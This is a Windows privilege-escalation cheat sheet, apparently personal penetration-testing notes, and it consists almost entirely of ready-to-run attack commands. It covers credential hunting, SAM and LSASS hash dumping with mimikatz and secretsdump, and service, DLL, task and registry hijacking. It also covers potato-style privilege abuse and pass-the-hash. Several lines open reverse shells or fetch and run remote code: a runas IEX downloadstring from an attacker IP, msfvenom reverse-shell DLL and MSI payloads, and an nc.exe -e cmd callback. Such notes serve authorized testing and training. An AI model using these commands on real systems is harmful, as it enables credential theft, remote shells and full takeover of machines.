# 📎 Windows Privesc

## Enumeration

```shell
# host info
systeminfo
ipconfig /all
route print
netstat -ano

# current user info
whoami
whoami /priv
whoami /groups
whoami /all

# local users info
net user
net user <user>
Get-LocalUser
# local groups info
net localgroup
net localgroup <group>
Get-LocalGroup
# get members
Get-LocalGroupMember <group>

# installed apps (32-bit and 64-bit)
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

# running process
Get-Process
Get-Process | Select-Object Name, Id, Path

# get .NET version
Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse
```

## Interesting Files

```powershell
# search for password manager dbs
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

# search for config files in XAMPP
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue

# search for docs in a user home directory
Get-ChildItem -Path C:\Users\ -Include *.txt,*.xml,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
# search in hidden directories too (-Force)
Get-ChildItem -Path C:\Users\ -Include *.txt, *.xml -File -Recurse -Force -ErrorAction SilentlyContinue

# search for passwords in all files
Get-ChildItem -Path C:\ -Recurse -File -Force -ErrorAction SilentlyContinue | Select-String -Pattern "password" -ErrorAction SilentlyContinue
# search for passwords in specific file types
Get-ChildItem -Path C:\ -Recurse -File -Force -Include "*.txt","*.config","*.json" -ErrorAction SilentlyContinue | Select-String -Pattern "password" -ErrorAction SilentlyContinue
```

## Passwords

### PowerShell History

```powershell
# show ps history
Get-History

# get history save path
(Get-PSReadlineOption).HistorySavePath
```

### Registry

```shell
# registry can be searched for keys and values that contain the word "password":
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# admin AutoLogon credentials:
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
```

### Runas with saved credentials

```shell
# show stored credentials
cmdkey /list

# transfer a reverse shell and execute it with the credentials or directly with PS
runas /savecred /user:admin reverse.exe
runas /savecred /user:admin "powershell -c IEX (New-Object
Net.Webclient).downloadstring('http://<ip>/rshell.ps1')"
```

### RunasCs

Useful for executing commands as another user with explicit credentials when you can't access in any other way.

> <https://github.com/antonioCoco/RunasCs>

```shell
Import-Module .\
Invoke-RunasCs <user> <pass> <cmd>
# rev shell
Invoke-RunasCs <user> <pass> powershell.exe -Remote <ip>:<port>
```

### SAM and SYSTEM

!!! info
    🐈‍⬛ Hashcat mode -> 1000

Find them

```powershell
# search in the current path
dir /s SAM
dir /s SYSTEM
Get-ChildItem -Filter "SAM" -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Filter "SYSTEM" -Recurse -ErrorAction SilentlyContinue

# possible locations
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system

C:\windows.old
```

Get the hash

```shell
# use pypykatz
pypykatz registry --sam sam system

# or secretsdump
impacket-secretsdump -system SYSTEM -sam SAM local #always mention local in the command
```

### Dumping Local Hashes

!!! info
    Requires SYSTEM privs

```shell
.\mimikatz.exe
privilege::debug
lsadump::sam

reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save

impacket-secretsdump administrator@<target_ip>
```

## Automated Scripts

> [winPEASany.exe](https://github.com/peass-ng/PEASS-ng)

> PowerUp.ps1

> [SharpUp.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)

> [Seatbelt.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)

## Services

### Binary Hijacking

```shell
# query running processes
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
# or in winpeas look for a service
YOU CAN MODIFY THIS SERVICE: AllAccess
File Permissions: Users [WriteData/CreateFiles]

# check permissions (F for full access)
icacls "<path>"

# replace the service binary with a reverse shell or change the binpath to it
sc config <svc_name> binpath="<rshell_path>"
sc stop <svc_name>
sc start <svc_name>
```

### Unquoted Service Paths

```shell
# list running and stopped services
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
# or cmd
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """"

# using icacls check all parts of the path
# upload a malicious file to the path, for example, user can write on 'Current Version' folder so
C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe

# upload the malicious file to that folder calling it 'current.exe'
# start the service
sc start <svc_name>
```

### Insecure Service Executables

```shell
# in winpeas look for a service which has the following
File Permissions: Everyone [AllAccess]

# replace the executable with a malicious file and start the service
sc start <service>
```

### Weak Registry Permissions

```shell
# in Winpeas look for a service which has the following
HKLM\system\currentcontrolset\services\<service> (Interactive [FullControl])

# check for KEY_ALL_ACCESS
accesschk /acceptula -uvwqk <path of registry> 

# Service Information from regedit, identify the variable that holds the executable
reg query <reg-path>

# Imagepath is the variable here
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f

sc start <service>
```

## DLL Hijacking

```shell
# list apps
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

# check if folder is writable
echo "test" > 'C:\FileZilla\FileZilla FTP Client\test.txt'
type 'C:\FileZilla\FileZilla FTP Client\test.txt'
```

Using Process Monitor, identify all DLLs loaded by the selected app as well as detect missing ones and try to replace one with a malicious file.

```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attack_box> LPORT=<lport> -f dll -o reverse.dll
```

Transfer the malicious dll to the path and restart the service.

```shell
sc stop <service>
sc start <service>
```

## Scheduled Tasks

```shell
# list tasks
schtasks /query /fo LIST /v
Get-ScheduledTask | Select-Object TaskName, TaskPath, State

# use icacls in the path to check perms
icalcs <path>

# upload the malicious file and wait for execution
```

## Startup Apps

!!! info
    For this to work, the system needs to be **restarted**

```shell
# startup applications can be found here
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp 

# check if folder is writable and transfer a reverse shell to it, the reboot the system
shutdown /r /t 0
```

## Insecure GUI Apps

```shell
# check the privileged applications that are running from "TaskManager"
# open one of them, and from the file menu click open and enter the following:
file://c:/windows/system32/cmd.exe
```

## Public Exploits and Security Updates

```shell
# enumerate the system
systeminfo
wmic qfe list
Get-HotFix | Sort-Object -Property InstalledOn -Descending
Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }
systeminfo | findstr /B /C:"KB"

# find a public exploit
searchsploit 'params'
```

## Registry

### Autorun

```shell
# query the registry for executables
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run

# check if the location is writable
accesschk.exe \accepteula -wvu "<path>" #returns FILE_ALL_ACCESS

# replace the executable with the reverse shell and wait for the Admin to login
```

### AlwaysInstallElevated

```shell
# query the registry for keys, it should return 1 or Ox1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# create a rev shell in msi format
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<port> --platform windows -f msi -o rshell.msi

# run the installer to trigger the shell
msiexec /quiet /qn /i rshell.msi
```

## Privileges

```shell
whoami /priv
```

### SeImpersonatePrivilege

> <https://github.com/BeichenDream/GodPotato>

> <https://github.com/antonioCoco/JuicyPotatoNG>

> <https://github.com/itm4n/PrintSpoofer>

```shell
# GodPotato
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "shell.exe"

# get .NET version
Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse

# JuicyPotatoNG
JuicyPotatoNG.exe -t * -p "shell.exe" -a

# PrintSpoofer
PrintSpoofer.exe -i -c powershell.exe
PrintSpoofer.exe -c "nc.exe <lhost> <lport> -e cmd"
```

### SeBackupPrivilege

```shell
# using robocopy, extract data from forbidden folders
robocopy /b c:\users\enterpriseadmin\desktop . * 

# or

# get sam and system
reg save hklm\sam .\sam
reg save hklm\system .\system     

# use pypykatz to get user hashes and PTH or hashcat with -m 1000 to get passwords
pypykatz registry --sam sam system

# or secretsdump
impacket-secretsdump -system SYSTEM -sam SAM local #always mention local in the command
```

### SeManageVolumePrivilege

> <https://github.com/CsEnox/SeManageVolumeExploit>

## Pass the Hash

!!! info
    Remember that the full hash includes both the LM and NTLM hash, separated by a colon.

```shell
pth-winexe -U 'administrator%hash' //10.10.56.135 cmd.exe
```
